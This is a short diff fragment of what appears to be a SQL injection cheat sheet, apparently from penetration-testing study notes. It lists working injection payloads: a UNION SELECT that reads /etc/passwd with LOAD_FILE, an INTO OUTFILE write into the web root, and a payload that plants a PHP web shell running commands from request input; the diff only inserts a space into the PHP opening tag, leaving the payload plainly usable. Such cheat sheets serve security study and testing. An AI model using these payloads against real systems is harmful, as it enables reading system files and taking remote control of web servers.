@@ -99,5 +99,5 @@ cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.glo
 ***File Injection***	
 cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -	| Read local file
 select 'file written successfully!' into outfile '/var/www/html/proof.txt'	| Write a string to a local file
-cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -	| Write a web shell into the base web directory
+cn' union select "",'< ?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -	| Write a web shell into the base web directory
   
